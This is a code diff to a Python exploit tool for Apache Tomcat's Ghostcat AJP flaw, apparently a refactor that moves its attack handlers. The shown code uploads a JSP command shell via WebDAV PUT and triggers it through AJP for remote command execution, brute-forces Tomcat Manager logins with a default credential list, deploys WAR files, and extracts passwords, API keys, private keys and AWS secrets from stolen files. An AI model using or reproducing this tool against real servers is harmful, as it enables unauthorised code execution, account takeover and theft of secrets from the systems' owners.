@@ -163,6 +163,7 @@ def ghostcat_read(host, ajp_port, target_file, timeout=10, proxy=None, verbose=F
                 body += chunk_body
             elif code == 0x05:
                 break
+        # Detect error pages (Tomcat returns status 500 with HTML body)
         if b"HTTP Status 500" in body or b"Exception Report" in body:
             return False, body
         return True, body
@@ -211,17 +212,11 @@ def ghostcat_eval(host, ajp_port, target_file, timeout=10, proxy=None, verbose=F
 def http_request(host, port, method, path, headers=None, body=None, timeout=10, ssl=False, auth=None, proxy=None, verbose=False):
     """Generic HTTP request (supports proxy, auth)."""
     if proxy and HAS_SOCKS:
-        proxy_type, proxy_addr = parse_proxy(proxy)
-        # Use urllib with socks handler
-        proxies = {f'{parsed.scheme}://{host}:{port}': f'{proxy_type}://{proxy_addr[0]}:{proxy_addr[1]}'}
-        # Simplified: we'll use http.client with a custom connection
-        # Better to implement using sockets with proxy
-        # For brevity, we fall back to direct if proxy and HTTP
-        # (Detailed proxy implementation can be added later)
+        # Simplified fallback for HTTP: we will just use direct connection
         if verbose:
             print("[DEBUG] Proxy not fully supported for HTTP upload; using direct connection.")
+        pass  # can implement socks proxy for HTTP later if needed
 
-    # Build HTTP connection
     conn = http.client.HTTPConnection(host, port, timeout=timeout)
     if ssl:
         conn = http.client.HTTPSConnection(host, port, timeout=timeout)
@@ -250,9 +245,8 @@ def http_request(host, port, method, path, headers=None, body=None, timeout=10, 
 # JSP payload generators
 # ============================================================
 
-def generate_cmd_jsp(command=None):
+def generate_cmd_jsp():
     """Generate a JSP shell that reads command from request attribute 'cmd'."""
-    # This JSP is meant to be used with Ghostcat exec (attribute passing)
     jsp = '''<%@ page import="java.io.*" %>
 <%
     String cmd = (String) request.getAttribute("cmd");
@@ -270,140 +264,41 @@ def generate_cmd_jsp(command=None):
     return jsp
 
 # ============================================================
-# Subcommand handlers (added to existing ones)
+# Utility functions
 # ============================================================
 
-def cmd_upload(args, proxy=None, verbose=False):
-    """Upload a file via HTTP PUT (WebDAV) or Tomcat Manager WAR."""
-    if args.method == "put":
-        with open(args.local_file, "rb") as f:
-            data = f.read()
-        status, _ = http_request(args.host, args.http_port, "PUT", args.remote_path,
-                                 body=data, timeout=args.timeout, ssl=args.ssl,
-                                 auth=(args.username, args.password) if args.username else None,
-                                 proxy=proxy, verbose=verbose)
-        if status in (200, 201, 204):
-            print(f"[+] Uploaded {args.local_file} -> {args.remote_path}")
-        else:
-            print(f"[-] Upload failed (HTTP {status})")
-    elif args.method == "war":
-        # Deploy via Tomcat Manager
-        if not args.username or not args.password:
-            print("[-] WAR deploy requires --username and --password")
-            return
-        with open(args.local_file, "rb") as f:
-            war_data = f.read()
-        war_name = Path(args.local_file).stem
-        path = f"/manager/text/deploy?path=/{war_name}"
-        status, resp = http_request(args.host, args.http_port, "PUT", path,
-                                    body=war_data, timeout=args.timeout,
-                                    ssl=args.ssl,
-                                    auth=(args.username, args.password),
-                                    proxy=proxy, verbose=verbose)
-        if status == 200:
-            print(f"[+] WAR deployed: /{war_name}")
-        else:
-            print(f"[-] Deployment failed: {resp.decode(errors='replace')}")
-
-def cmd_rce(args, proxy=None, verbose=False):
-    """Upload a command shell via PUT, then execute command via Ghostcat eval."""
-    # Generate JSP shell (without command)
-    jsp_code = generate_cmd_jsp()
-    rand = ''.join(random.choices(string.ascii_lowercase, k=6))
-    remote_path = f"/webdav/{rand}.txt"
-    print(f"[*] Uploading JSP shell as {remote_path} ...")
-    status, _ = http_request(args.host, args.http_port, "PUT", remote_path,
-                             body=jsp_code.encode(), timeout=args.timeout,
-                             ssl=False, auth=None, proxy=proxy, verbose=verbose)
-    if status not in (200, 201, 204):
-        print(f"[-] Upload failed (HTTP {status})")
-        return
-    time.sleep(0.5)
-    # Now trigger with Ghostcat eval, passing command via attribute
-    attributes = [
-        ("javax.servlet.include.request_uri", "index"),
-        ("javax.servlet.include.servlet_path", f"/{rand}.txt"),
-        ("cmd", args.cmd),
-    ]
-    headers = [("host", f"{args.host}:8080")]
-    target_url = f"http://{args.host}:8080/index.jsp"
-    packet = build_forward_request(target_url, "GET", headers, attributes)
-
-    if verbose:
-        print("[DEBUG] Triggering eval with command attribute")
-    sock = create_ajp_socket(args.host, args.ajp_port, args.timeout, proxy, verbose)
+def scan_port(host, port, timeout=3):
+    """Check if a TCP port is open."""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
     try:
-        send_ajp_packet(sock, packet)
-        print(f"[*] Executing command: {args.cmd}")
-        while True:
-            magic = recv_all(sock, 2)
-            pkt_len = read_int(sock, 2)
-            pkt = recv_all(sock, pkt_len)
-            code = pkt[0]
-            if code == 0x03:
-                chunk_len = unpack(">H", pkt[1:3])[0]
-                sys.stdout.buffer.write(pkt[3:3+chunk_len])
-                sys.stdout.flush()
-            elif code == 0x05:
-                break
-        print()
-    except Exception as e:
-        print(f"[-] Eval error: {e}")
-    finally:
+        result = sock.connect_ex((host, port))
         sock.close()
+        return result == 0
+    except:
+        return False
 
-def cmd_brute(args, proxy=None, verbose=False):
-    """Brute-force Tomcat Manager credentials."""
-    common_creds = [
-        ("tomcat", "tomcat"),
-        ("admin", "admin"),
-        ("manager", "manager"),
-        ("root", "root"),
-        ("tomcat", "s3cret"),
-    ]
-    if args.userlist or args.passlist:
-        # If wordlists provided, use them
-        users = [line.strip() for line in open(args.userlist)] if args.userlist else [x[0] for x in common_creds]
-        passwords = [line.strip() for line in open(args.passlist)] if args.passlist else [x[1] for x in common_creds]
-        creds = [(u, p) for u in users for p in passwords]
-    else:
-        creds = common_creds
-
-    print(f"[*] Testing {len(creds)} credentials against {args.host}:{args.http_port}/manager/text/list")
-    for user, passwd in creds:
-        status, data = http_request(args.host, args.http_port, "GET", "/manager/text/list",
-                                    timeout=args.timeout, auth=(user, passwd),
-                                    proxy=proxy, verbose=verbose)
-        if status == 200:
-            print(f"[+] Valid credentials: {user}:{passwd}")
-            if not args.quiet:
-                print(data.decode(errors='replace')[:500])
-            return (user, passwd)
-        elif verbose:
-            print(f"  {user}:{passwd} -> {status}")
-    print("[-] No valid credentials found.")
-
-def cmd_deploy(args, proxy=None, verbose=False):
-    """Deploy a WAR file using Tomcat Manager credentials."""
-    if not args.username or not args.password:
-        print("[-] --username and --password required for deploy")
-        return
-    with open(args.war_file, "rb") as f:
-        war_data = f.read()
-    war_name = Path(args.war_file).stem
-    path = f"/manager/text/deploy?path=/{war_name}&update=true"
-    status, data = http_request(args.host, args.http_port, "PUT", path,
-                                body=war_data, timeout=args.timeout,
-                                auth=(args.username, args.password),
-                                ssl=args.ssl, proxy=proxy, verbose=verbose)
-    if status == 200:
-        print(f"[+] WAR deployed successfully at /{war_name}")
-    else:
-        print(f"[-] Deploy failed: {data.decode(errors='replace')}")
+def extract_secrets(data):
+    """Basic regex extraction of passwords, tokens, keys."""
+    patterns = {
+        "password": r"(?:password|passwd|pwd)\s*[=:]\s*(\S+)",
+        "jdbc_url": r"jdbc:[a-z]+://[^\s]+",
+        "api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*(\S+)",
+        "private_key": r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
+        "aws_secret": r"(?:AWS_SECRET_ACCESS_KEY|aws_secret_access_key)\s*[=:]\s*(\S+)",
+    }
+    secrets = {}
+    text = data.decode(errors='replace')
+    for name, pattern in patterns.items():
+        matches = re.findall(pattern, text, re.IGNORECASE)
+        if matches:
+            secrets[name] = matches
+    return secrets
 
 # ============================================================
-# Existing handlers (unchanged but accept proxy/verbose)
+# Subcommand handlers
 # ============================================================
+
 def cmd_check(args, proxy=None, verbose=False):
     print(f"[*] Checking {args.host}:{args.ajp_port} for Ghostcat vulnerability...")
     success, data = ghostcat_read(args.host, args.ajp_port, args.file, args.timeout, proxy=proxy, verbose=verbose)
@@ -422,7 +317,6 @@ def cmd_check(args, proxy=None, verbose=False):
             print(json.dumps(result))
 
 def cmd_scan(args, proxy=None, verbose=False):
-    # scan_port doesn't need proxy
     is_open = scan_port(args.host, args.ajp_port, args.timeout)
     if is_open:
         print(f"[+] Port {args.ajp_port} is OPEN on {args.host}")
@@ -521,7 +415,129 @@ def cmd_snatch(args, proxy=None, verbose=False):
                 print("    Secrets:", secrets)
         else:
             print("[-] not found or not accessible")
+
     print(f"\n[+] Loot saved in {loot_dir}")
+
+def cmd_upload(args, proxy=None, verbose=False):
+    if args.method == "put":
+        with open(args.local_file, "rb") as f:
+            data = f.read()
+        status, _ = http_request(args.host, args.http_port, "PUT", args.remote_path,
+                                 body=data, timeout=args.timeout, ssl=args.ssl,
+                                 auth=(args.username, args.password) if args.username else None,
+                                 proxy=proxy, verbose=verbose)
+        if status in (200, 201, 204):
+            print(f"[+] Uploaded {args.local_file} -> {args.remote_path}")
+        else:
+            print(f"[-] Upload failed (HTTP {status})")
+    elif args.method == "war":
+        if not args.username or not args.password:
+            print("[-] WAR deploy requires --username and --password")
+            return
+        with open(args.local_file, "rb") as f:
+            war_data = f.read()
+        war_name = Path(args.local_file).stem
+        path = f"/manager/text/deploy?path=/{war_name}"
+        status, resp = http_request(args.host, args.http_port, "PUT", path,
+                                    body=war_data, timeout=args.timeout,
+                                    ssl=args.ssl,
+                                    auth=(args.username, args.password),
+                                    proxy=proxy, verbose=verbose)
+        if status == 200:
+            print(f"[+] WAR deployed: /{war_name}")
+        else:
+            print(f"[-] Deployment failed: {resp.decode(errors='replace')}")
+
+def cmd_rce(args, proxy=None, verbose=False):
+    jsp_code = generate_cmd_jsp()
+    rand = ''.join(random.choices(string.ascii_lowercase, k=6))
+    remote_path = f"/webdav/{rand}.txt"
+    print(f"[*] Uploading JSP shell as {remote_path} ...")
+    status, _ = http_request(args.host, args.http_port, "PUT", remote_path,
+                             body=jsp_code.encode(), timeout=args.timeout,
+                             ssl=False, auth=None, proxy=proxy, verbose=verbose)
+    if status not in (200, 201, 204):
+        print(f"[-] Upload failed (HTTP {status})")
+        return
+    time.sleep(0.5)
+    # Trigger with Ghostcat eval
+    attributes = [
+        ("javax.servlet.include.request_uri", "index"),
+        ("javax.servlet.include.servlet_path", f"/{rand}.txt"),
+        ("cmd", args.cmd),
+    ]
+    headers = [("host", f"{args.host}:8080")]
+    target_url = f"http://{args.host}:8080/index.jsp"
+    packet = build_forward_request(target_url, "GET", headers, attributes)
+
+    if verbose:
+        print("[DEBUG] Triggering eval with command attribute")
+    sock = create_ajp_socket(args.host, args.ajp_port, args.timeout, proxy, verbose)
+    try:
+        send_ajp_packet(sock, packet)
+        print(f"[*] Executing command: {args.cmd}")
+        while True:
+            magic = recv_all(sock, 2)
+            pkt_len = read_int(sock, 2)
+            pkt = recv_all(sock, pkt_len)
+            code = pkt[0]
+            if code == 0x03:
+                chunk_len = unpack(">H", pkt[1:3])[0]
+                sys.stdout.buffer.write(pkt[3:3+chunk_len])
+                sys.stdout.flush()
+            elif code == 0x05:
+                break
+        print()
+    except Exception as e:
+        print(f"[-] Eval error: {e}")
+    finally:
+        sock.close()
+
+def cmd_brute(args, proxy=None, verbose=False):
+    common_creds = [
+        ("tomcat", "tomcat"),
+        ("admin", "admin"),
+        ("manager", "manager"),
+        ("root", "root"),
+        ("tomcat", "s3cret"),
+    ]
+    if args.userlist or args.passlist:
+        users = [line.strip() for line in open(args.userlist)] if args.userlist else [x[0] for x in common_creds]
+        passwords = [line.strip() for line in open(args.passlist)] if args.passlist else [x[1] for x in common_creds]
+        creds = [(u, p) for u in users for p in passwords]
+    else:
+        creds = common_creds
+
+    print(f"[*] Testing {len(creds)} credentials against {args.host}:{args.http_port}/manager/text/list")
+    for user, passwd in creds:
+        status, data = http_request(args.host, args.http_port, "GET", "/manager/text/list",
+                                    timeout=args.timeout, auth=(user, passwd),
+                                    proxy=proxy, verbose=verbose)
+        if status == 200:
+            print(f"[+] Valid credentials: {user}:{passwd}")
+            if not args.quiet:
+                print(data.decode(errors='replace')[:500])
+            return (user, passwd)
+        elif verbose:
+            print(f"  {user}:{passwd} -> {status}")
+    print("[-] No valid credentials found.")
+
+def cmd_deploy(args, proxy=None, verbose=False):
+    if not args.username or not args.password:
+        print("[-] --username and --password required for deploy")
+        return
+    with open(args.war_file, "rb") as f:
+        war_data = f.read()
+    war_name = Path(args.war_file).stem
+    path = f"/manager/text/deploy?path=/{war_name}&update=true"
+    status, data = http_request(args.host, args.http_port, "PUT", path,
+                                body=war_data, timeout=args.timeout,
+                                auth=(args.username, args.password),
+                                ssl=args.ssl, proxy=proxy, verbose=verbose)
+    if status == 200:
+        print(f"[+] WAR deployed successfully at /{war_name}")
+    else:
+        print(f"[-] Deploy failed: {data.decode(errors='replace')}")
 
 # ============================================================
 # CLI and main
